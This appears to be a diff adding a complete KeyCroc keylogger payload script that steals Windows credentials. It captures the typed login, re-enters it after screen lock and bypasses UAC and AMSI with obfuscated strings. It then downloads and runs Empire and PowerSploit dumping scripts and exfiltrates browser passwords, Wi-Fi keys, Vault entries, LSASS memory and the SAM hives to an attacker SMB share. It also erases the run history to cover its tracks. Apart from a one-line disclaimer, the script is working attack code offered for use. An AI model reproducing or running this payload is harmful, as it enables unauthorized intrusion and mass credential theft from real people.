@@ -1,0 +1,283 @@
+#  ██████╗ █████╗ ███╗   ███╗ ██████╗ ███████╗███████╗██████╗  ██████╗ ██████╗  █████╗ ██╗   ██╗
+# ██╔════╝██╔══██╗████╗ ████║██╔═══██╗╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
+# ██║     ███████║██╔████╔██║██║   ██║  ███╔╝ █████╗  ██████╔╝██║   ██║██║  ██║███████║ ╚████╔╝ 
+# ██║     ██╔══██║██║╚██╔╝██║██║   ██║ ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██║  ██║██╔══██║  ╚██╔╝  
+# ╚██████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝███████╗███████╗██║  ██║╚██████╔╝██████╔╝██║  ██║   ██║   
+#  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
+                                                                                              
+
+
+
+
+
+
+#!/bin/bash
+#	BEGINNING OF PAYLOAD
+
+# Title: Cred_Exfil_on_Screenlock
+# Author: David Osisek
+# Description: Captures credentials, waits for lock screen, logs back in, delivers payload, then locks the screen.
+#              Dumps usernames & plaintext passwords from Browsers (Chrome, FireFox), Windows Vault, Wi-Fi, SAM, LSASS, and system information.
+# Target: Windows 8/10/11
+# Version: 1.4
+# Category: Exfiltration
+# Disclaimer: This script is for educational and authorized use only. Misuse of this script is illegal and unethical. Use with explicit permission from the system owner.
+# Requirements: Impacket, gohttp, Go, pip3
+
+MATCH __dumpcreds
+
+LOOTDIR=/root/loot/dumpcreds
+LOGFILE="${LOOTDIR}/execution_log.txt"
+
+# Specify target's PC keyboard language (English)
+export DUCKY_LANG=en
+
+# Create loot and log directory
+timestamp=$(date +%s)
+mkdir -p ${LOOTDIR}/${timestamp}
+touch $LOGFILE
+
+echo "Starting payload execution at $(date)" >> $LOGFILE
+
+# Install Go if not installed
+echo "Checking for Go installation..." >> $LOGFILE
+if ! command -v go &> /dev/null; then
+    echo "Go not found, installing..." >> $LOGFILE
+    apt-get update && apt-get install -y golang
+    echo "Go installed successfully." >> $LOGFILE
+else
+    echo "Go already installed." >> $LOGFILE
+fi
+
+# Install pip3 if not installed
+echo "Checking for pip3 installation..." >> $LOGFILE
+if ! command -v pip3 &> /dev/null; then
+    echo "pip3 not found, installing..." >> $LOGFILE
+    apt-get update && apt-get install -y python3-pip
+    echo "pip3 installed successfully." >> $LOGFILE
+else
+    echo "pip3 already installed." >> $LOGFILE
+fi
+
+# Install Required Tools (Impacket, gohttp) if missing
+echo "Checking for required tools..." >> $LOGFILE
+if ! command -v gohttp &> /dev/null; then
+    echo "gohttp not found, installing..." >> $LOGFILE
+    go get github.com/blmayer/gohttp
+    echo "gohttp installed successfully." >> $LOGFILE
+else
+    echo "gohttp already installed." >> $LOGFILE
+fi
+
+if ! python3 -c "import impacket" &> /dev/null; then
+    echo "Impacket not found, installing..." >> $LOGFILE
+    pip3 install impacket
+    echo "Impacket installed successfully." >> $LOGFILE
+else
+    echo "Impacket already installed." >> $LOGFILE
+fi
+
+# Download Required Scripts (ChromeDump, FoxDump, Out-Minidump) if missing
+echo "Checking for required PowerShell scripts..." >> $LOGFILE
+mkdir -p /tools/DumpCreds
+
+if [ ! -f "/tools/DumpCreds/Get-ChromeDump.ps1" ]; then
+    echo "Downloading Get-ChromeDump.ps1..." >> $LOGFILE
+    wget -q -O /tools/DumpCreds/Get-ChromeDump.ps1 "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1"
+    echo "Get-ChromeDump.ps1 downloaded." >> $LOGFILE
+fi
+
+if [ ! -f "/tools/DumpCreds/Get-FoxDump.ps1" ]; then
+    echo "Downloading Get-FoxDump.ps1..." >> $LOGFILE
+    wget -q -O /tools/DumpCreds/Get-FoxDump.ps1 "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-FoxDump.ps1"
+    echo "Get-FoxDump.ps1 downloaded." >> $LOGFILE
+fi
+
+if [ ! -f "/tools/DumpCreds/Out-Minidump.ps1" ]; then
+    echo "Downloading Out-Minidump.ps1..." >> $LOGFILE
+    wget -q -O /tools/DumpCreds/Out-Minidump.ps1 "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Out-Minidump.ps1"
+    echo "Out-Minidump.ps1 downloaded." >> $LOGFILE
+fi
+
+echo "Required scripts check completed." >> $LOGFILE
+
+# KeyCroc-specific logic to capture credentials, wait for lock screen, and deliver the payload
+
+# Capture username and password
+MATCH user_pass_capture     # Change this to match the sequence you want to detect (e.g., REGEX for username/password input)
+LOG "Captured username and password"
+STORE $username $password   # Store credentials for later use
+
+# Wait for lock sequence (Win+L) and then log in when the system is unlocked
+MATCH WIN-L                 # Detect Windows Lock Screen (Win + L key combination)
+LOG "Windows lock screen detected"
+
+# Wait for unlock event (keyboard or mouse movement)
+MATCH unlock_event
+QUACK STRING $username
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING $password
+QUACK ENTER
+QUACK DELAY 2000
+
+# After logging in, deliver the payload
+echo "Delivering payload after login at $(date)" >> $LOGFILE
+
+# Switch to ETHERNET ATTACKMODE (Windows)
+if [ ! -f "/tmp/vidpid" ]
+then
+        ATTACKMODE RNDIS_ETHERNET HID VID_0X1234 PID_0X5678
+else
+        VENDOR=$(cat /tmp/vidpid | cut -d: -f1)
+        PRODUCT=$(cat /tmp/vidpid | cut -d: -f2)
+        ATTACKMODE RNDIS_ETHERNET HID VID_0X$VENDOR PID_0X$PRODUCT
+fi
+QUACK DELAY 5000
+
+# Get KeyCroc's LAN IP
+croc_ip=$(ifconfig usb0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
+SHARE="\\\\${croc_ip}\\s"
+
+# Temporary www and smb directories
+mkdir -p /tmp/www
+mkdir -p /tmp/smb
+
+# Prepare scripts
+cp -r /tools/DumpCreds/* /tmp/www/
+
+# Start HTTP and SMB servers
+sleep 2
+cd /tmp/www/ && gohttp -p 80 &
+echo "Started HTTP server at $(date)" >> $LOGFILE
+sleep 2
+python3 /tools/impacket/examples/smbserver.py s /tmp/smb -smb2support &
+echo "Started SMB server at $(date)" >> $LOGFILE
+
+# Run the payload
+QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"Start-Process cmd -A '/t:4f /k mode con lines=1 cols=500' -Verb runAs\""
+QUACK ENTER
+QUACK DELAY 200
+
+# Bypass UAC
+QUACK DELAY 500
+QUACK ALT-y
+QUACK DELAY 200
+QUACK ENTER
+QUACK DELAY 500
+QUACK ALT-n
+QUACK DELAY 200
+QUACK ENTER
+
+# Start Attack
+# Launch powershell and extract systeminfo
+sleep 2
+QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
+QUACK ENTER
+QUACK STRING "[Ref].Assembly.GetType('Sy'+'stem.Managem'+'ent.Aut'+'omation.Am'+'s'+'iUt'+'ils').GetField('a'+'m'+'si'+'In'+'itFa'+'iled','No'+'nPub'+'lic,Static').SetValue(\$null,\$true)"
+QUACK ENTER
+QUACK STRING "\$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")"
+QUACK ENTER
+echo "Checked admin privileges at $(date)" >> $LOGFILE
+
+QUACK STRING "net use $SHARE /user:\"anonymous\" \"\""
+QUACK ENTER
+QUACK STRING "systeminfo | Out-file $SHARE\\DumpCreds_systeminfo.txt"
+QUACK ENTER
+echo "Extracted system info at $(date)" >> $LOGFILE
+QUACK DELAY 200
+
+# Extract Chrome, Firefox Data
+QUACK STRING "IEX (New-Object Net.Webclient).DownloadString('http://${croc_ip}/Get-ChromeDump.ps1');"
+QUACK ENTER
+QUACK STRING "Stop-Process -name chrome -ErrorAction SilentlyContinue -Force; sleep 10; Get-ChromeDump -OutFile $SHARE\\DumpCreds_ChromeDump.txt"
+QUACK ENTER
+echo "Extracted Chrome data at $(date)" >> $LOGFILE
+QUACK DELAY 200
+
+QUACK STRING "IEX (New-Object Net.Webclient).DownloadString('http://${croc_ip}/Get-FoxDump.ps1');"
+QUACK ENTER
+QUACK STRING "Stop-Process -name firefox -ErrorAction SilentlyContinue -Force; sleep 10; Get-FoxDump -OutFile $SHARE\\DumpCreds_FoxDump.txt"
+QUACK ENTER
+echo "Extracted Firefox data at $(date)" >> $LOGFILE
+QUACK DELAY 200
+
+# Extract Wi-Fi Data
+QUACK STRING "(netsh wlan show profiles) | Select-String \"\:(.+)\$\" | %{\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)}  | Select-String \"^.+Cont.+\\W+\\:(.+)\$\" | %{\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Format-Table -AutoSize | Out-File $SHARE\\DumpCreds_WiFiDump.txt"
+QUACK ENTER
+echo "Extracted Wi-Fi credentials at $(date)" >> $LOGFILE
+QUACK DELAY 200
+
+# Extract Windows Credentials from PasswordVault and WinLogon registry
+QUACK STRING "[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { \$_.RetrievePassword();\$_ } | Out-File $SHARE\\DumpCreds_VaultDump.txt"
+QUACK ENTER
+echo "Extracted Windows Vault credentials at $(date)" >> $LOGFILE
+QUACK DELAY 200
+QUACK STRING "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" | findstr /i \"DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername\" | Out-File $SHARE\\DumpCreds_WinLogon.txt"
+QUACK ENTER
+echo "Extracted WinLogon credentials at $(date)" >> $LOGFILE
+QUACK DELAY 200
+
+# If Admin, dump memory of lsass.exe and sam/security/system registries
+QUACK STRING "if (\$isAdmin) { IEX (New-Object Net.Webclient).DownloadString('http://${croc_ip}/Out-Minidump.ps1');}"
+QUACK ENTER
+QUACK STRING "if (\$isAdmin) { Get-Process lsass | Out-Minidump -DumpFilePath $SHARE}"
+QUACK ENTER
+echo "Extracted LSASS memory dump at $(date)" >> $LOGFILE
+QUACK DELAY 200
+QUACK STRING "if (\$isAdmin) { reg.exe save hklm\\sam $SHARE\\sam }"
+QUACK ENTER
+QUACK STRING "if (\$isAdmin) { reg.exe save hklm\\security $SHARE\\security }"
+QUACK ENTER
+QUACK STRING "if (\$isAdmin) { reg.exe save hklm\\system $SHARE\\system }"
+QUACK ENTER
+echo "Extracted SAM, Security, System registry data at $(date)" >> $LOGFILE
+QUACK DELAY 200
+
+QUACK STRING "echo EXFILTRATION_COMPLETE > $SHARE\\EXFILTRATION_COMPLETE"
+QUACK ENTER
+
+# Remove Run History
+QUACK STRING "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+QUACK ENTER
+QUACK DELAY 200
+QUACK STRING "exit"
+QUACK ENTER
+QUACK UNLOCK
+
+# Wait until files are done copying.
+while ! [ -f /tmp/smb/EXFILTRATION_COMPLETE ]; do sleep 1; done
+
+# Start Cleanup
+sleep 2
+# Delete Exfil file
+rm /tmp/smb/EXFILTRATION_COMPLETE
+# Move data to loot directory
+mv /tmp/smb/* ${LOOTDIR}/${timestamp}
+
+# Clean up temporary directories
+rm -rf /tmp/www/
+rm -rf /tmp/smb/
+echo "Cleaned up temporary directories at $(date)" >> $LOGFILE
+
+# Stop HTTP and SMB servers
+kill $(ps -C "gohttp -p 80" -o pid --no-headers)
+kill $(ps -C "python3 /tools/impacket/examples/smbserver.py s /tmp/smb -smb2support" -o pid --no-headers)
+echo "Stopped HTTP and SMB servers at $(date)" >> $LOGFILE
+
+# Deactivate ETHERNET ATTACKMODE
+if [ ! -f "/tmp/vidpid" ]
+then
+        ATTACKMODE HID VID_0X1234 PID_0X5678
+else
+        VENDOR=$(cat /tmp/vidpid | cut -d: -f1)
+        PRODUCT=$(cat /tmp/vidpid | cut -d: -f2)
+        ATTACKMODE HID VID_0X$VENDOR PID_0X$PRODUCT
+fi
+
+# Lock the screen after payload execution
+QUACK WIN-L
+
+echo "Payload completed and screen locked at $(date)" >> $LOGFILE
+
+# Complete
